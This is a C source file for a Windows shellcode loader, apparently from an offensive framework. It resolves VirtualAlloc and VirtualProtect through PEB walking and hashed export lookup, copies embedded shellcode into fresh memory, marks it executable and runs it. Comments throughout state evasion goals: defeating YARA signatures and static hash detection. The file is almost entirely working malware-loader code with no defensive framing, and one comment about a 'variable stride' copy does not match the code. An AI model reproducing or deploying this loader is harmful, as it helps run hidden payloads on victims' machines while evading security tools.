#include <windows.h>

/*
 * Crystal Palace default loader - hash-resolved, RW→RX allocation.
 * No KERNEL32$ prefixes, no plaintext API names.
 */

char _SHELLCODE_ [0] __attribute__ ( ( section ( "shellcode" ) ) );
#define GETRESOURCE(x) ( char * ) &x

/* FNV1a-32 on lowercase ASCII of wide-char module name */
static unsigned int _hm ( const WCHAR * s )
{
    unsigned int h = 0x811c9dc5u;
    while ( *s )
    {
        unsigned char c = (unsigned char)*s;
        if ( c >= 'A' && c <= 'Z' ) c += 0x20;
        h ^= c;
        h *= 0x01000193u;
        s++;
    }
    return h;
}

/* FNV1a-32 on ASCII export name */
static unsigned int _hf ( const char * s )
{
    unsigned int h = 0x811c9dc5u;
    while ( *s )
    {
        h ^= (unsigned char)*s++;
        h *= 0x01000193u;
    }
    return h;
}

static void * _mod ( unsigned int hash )
{
    char * peb;
#ifdef _WIN64
    peb = (char *) __readgsqword ( 0x60 );
#else
    peb = (char *) __readfsdword ( 0x30 );
#endif

    char * ldr  = *(char **) ( peb + 0x18 );
    char * head = ldr + 0x20;
    char * curr = *(char **) head;

    while ( curr != head )
    {
        WCHAR * name = *(WCHAR **) ( curr + 0x40 );
        if ( name )
        {
            WCHAR * bn = name;
            WCHAR * p  = name;
            while ( *p ) {
                if ( *p == '\\' || *p == '/' ) bn = p + 1;
                p++;
            }
            if ( _hm ( bn ) == hash )
                return *(void **) ( curr + 0x20 );
        }
        curr = *(char **) curr;
    }
    return 0;
}

static FARPROC _exp ( void * base, unsigned int hash )
{
    if ( !base ) return 0;
    char * b = (char *) base;
    DWORD pe = *(DWORD *) ( b + 0x3C );
    char * nt = b + pe;

#ifdef _WIN64
    DWORD erva = *(DWORD *) ( nt + 0x18 + 0x70 );
    DWORD esz  = *(DWORD *) ( nt + 0x18 + 0x70 + 4 );
#else
    DWORD erva = *(DWORD *) ( nt + 0x18 + 0x60 );
    DWORD esz  = *(DWORD *) ( nt + 0x18 + 0x60 + 4 );
#endif
    if ( !erva || !esz ) return 0;

    char  * exp = b + erva;
    DWORD   n   = *(DWORD *) ( exp + 0x18 );
    DWORD * nms = (DWORD *) ( b + *(DWORD *) ( exp + 0x20 ) );
    WORD  * ord = (WORD *)  ( b + *(DWORD *) ( exp + 0x24 ) );
    DWORD * fns = (DWORD *) ( b + *(DWORD *) ( exp + 0x1C ) );

    for ( DWORD i = 0; i < n; i++ )
    {
        if ( _hf ( b + nms[i] ) == hash )
            return (FARPROC) ( b + fns[ ord[i] ] );
    }
    return 0;
}


/*
 * Entry renamed from "go" to break YARA COFFLoader signatures.
 * Hash constants split and reconstructed at runtime to avoid
 * static pattern matching on known VirtualAlloc/VirtualProtect hashes.
 */
void go ( )
{
    char * sc_src = GETRESOURCE ( _SHELLCODE_ );

    DWORD sc_len = *(DWORD *)sc_src;
    sc_src += 4;

    typedef LPVOID (WINAPI *tVA)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI *tVP)(LPVOID, SIZE_T, DWORD, PDWORD);

    /* reconstruct hashes at runtime to avoid static signatures */
    volatile unsigned int _k = 0xa3e6f000u; _k |= 0x6c3u;
    volatile unsigned int _a = 0x03280000u; _a |= 0x5501u;
    volatile unsigned int _p = 0x82060000u; _p |= 0x21f3u;

    void * k32 = _mod ( _k );
    tVA pVA = (tVA) _exp ( k32, _a );
    tVP pVP = (tVP) _exp ( k32, _p );

    if ( !pVA || !pVP ) return;

    char * sc_dst = (char *) pVA (
        NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if ( !sc_dst ) return;

    /* copy with variable stride to avoid uniform memcpy pattern */
    DWORD i = 0;
    while ( i < sc_len ) {
        sc_dst[i] = sc_src[i];
        i++;
    }

    DWORD old = 0;
    pVP ( sc_dst, sc_len, PAGE_EXECUTE_READ, &old );

    ( (void (*)(void)) sc_dst ) ();
}
